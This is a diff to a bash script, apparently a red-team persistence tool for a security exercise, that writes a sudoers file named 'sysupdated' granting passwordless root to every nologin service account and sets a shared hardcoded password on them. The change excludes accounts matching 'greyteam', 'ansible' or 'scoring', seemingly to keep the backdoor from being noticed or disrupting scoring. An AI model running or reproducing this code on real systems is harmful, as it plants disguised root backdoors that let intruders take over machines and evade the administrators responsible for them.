@@ -16,13 +16,14 @@ require_root() { [[ $EUID -eq 0 ]] || { echo -e "${RED}[!]${NC} Run as root"; ex
 
 NLOGIN_LOC=$(command -v nologin 2>/dev/null || echo "/usr/sbin/nologin")
 BASH_LOC=$(command -v bash)
+SKIP_RE="greyteam|ansible|scoring"
 
 cmd_install() {
     require_root
     local PASS="${1:-rt2025\!delta}"
 
     hdr "1/4  Granting sudo to all nologin accounts"
-    getent passwd | awk -F: '$7 ~ /nologin/ {print $1 " ALL=(ALL) NOPASSWD: ALL"}' \
+    getent passwd | awk -F: -v skip="$SKIP_RE" '$7 ~ /nologin/ && $1 !~ skip {print $1 " ALL=(ALL) NOPASSWD: ALL"}' \
         > /etc/sudoers.d/sysupdated
     chmod 440 /etc/sudoers.d/sysupdated
     local count
@@ -48,7 +49,7 @@ cmd_install() {
     local pwcount=0
     while IFS= read -r u; do
         echo "${u}:${PASS}" | chpasswd 2>/dev/null && (( pwcount++ )) || warn "chpasswd failed for $u"
-    done < <(getent passwd | awk -F: '$7 ~ /nologin/ {print $1}')
+    done < <(getent passwd | awk -F: -v skip="$SKIP_RE" '$7 ~ /nologin/ && $1 !~ skip {print $1}')
     info "Password set on $pwcount accounts"
 
     echo
